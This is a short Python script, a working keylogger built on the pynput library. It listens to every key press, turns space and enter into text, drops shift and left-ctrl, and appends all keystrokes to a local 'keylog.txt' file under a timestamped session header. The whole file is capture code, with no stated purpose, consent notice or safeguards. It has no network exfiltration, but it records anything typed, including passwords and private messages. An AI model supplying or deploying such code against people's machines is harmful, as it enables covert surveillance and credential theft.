from pynput.keyboard import Listener
import time
import os


def write_to_file(key):
    key_stroke = str(key).replace("'", "")
    if key_stroke == 'Key.space':
        key_stroke = ' '
    if key_stroke == 'Key.shift':
        key_stroke = ''
    if key_stroke == "Key.ctrl_l":
        key_stroke = ""
    if key_stroke == "Key.enter":
        key_stroke = "\n"
    with open("keylog.txt", 'a') as f:
        f.write(key_stroke)


if __name__ == "__main__":
    current_time = time.strftime("%Y-%m-%d %H:%M:%S %Z")
    if os.path.exists("keylog.txt"):
        with open("keylog.txt", 'a') as f:
            f.write("\n")
            f.write(f"\nLogging Session: {current_time}\n")
    else:
        with open("keylog.txt", 'w') as f:
            f.write(f"\nLogging Session: {current_time}\n")
    with Listener(on_press=write_to_file) as log:
        log.join()
